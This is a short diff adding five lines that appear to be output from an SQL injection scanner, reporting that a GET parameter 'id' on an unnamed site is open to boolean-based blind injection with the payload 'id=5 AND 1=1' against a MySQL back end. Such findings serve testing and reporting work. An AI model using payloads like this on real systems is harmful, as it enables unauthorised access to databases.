@@ -1,0 +1,5 @@
+Parameter: id (GET)
+    Type: boolean-based blind
+Payload: id=5 AND 1=1
+[INFO] the back-end DBMS is MySQL
+GET parameter 'id' is vulnerable
